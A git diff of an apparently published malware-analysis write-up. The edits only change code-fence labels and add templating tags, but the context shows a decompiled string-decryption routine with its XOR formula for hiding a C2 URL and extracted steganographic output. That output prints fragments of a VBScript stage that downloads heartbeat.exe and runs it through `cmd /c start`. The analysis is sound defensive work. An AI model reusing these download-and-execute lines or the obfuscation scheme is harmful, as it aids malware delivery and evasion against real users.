@@ -239,7 +239,7 @@ void _p(void)
 
 Analyzing `_d`, we can reconstruct the custom encryption algorithm.
 
-```javascript
+```shell
 void _d(longlong param_1,longlong param_2,ulonglong param_3)
 {
   undefined8 local_10;
@@ -254,6 +254,7 @@ void _d(longlong param_1,longlong param_2,ulonglong param_3)
 ```
 
 The algorithm is:
+
 $$DecryptedByte[i] = (i \times 0x29) \oplus EncryptedByte[i] \oplus 0x4C$$
 
 This is a simple symmetric obscured algorithm. The malware author likely wrote this to prevent simple `strings` commands from revealing the C2 URL.
@@ -367,7 +368,8 @@ else:
 ![Stego Script](../../../../assets/img/Pasted%20image%2020260216225802.png)
 ![Stego Result](../../../../assets/img/Pasted%20image%2020260216225910.png)
 
-```C
+{% raw %}
+```shell
 Marker found at offset 36
 Payload length: 2440 bytes
 First 20 bytes (raw): b"\x00\x08?1\x1a\x15\x15)'*%(7v\x1e!\x06\x14\x17$"
@@ -383,6 +385,7 @@ xh.Send
 ' ... Saves to heartbeat.exe and runs it
 ws.Run "cmd /c start "" "" & dp & """, 0, False
 ```
+{% endraw %}
 
 The extracted payload is, yet again, a VBScript. This multi-stage approach (HTA -> DLL -> PS1 -> Stego -> VBS) is designed to exhaust the defenders and automated sandboxes. This final script downloads the actual binary: `heartbeat.exe`.
 
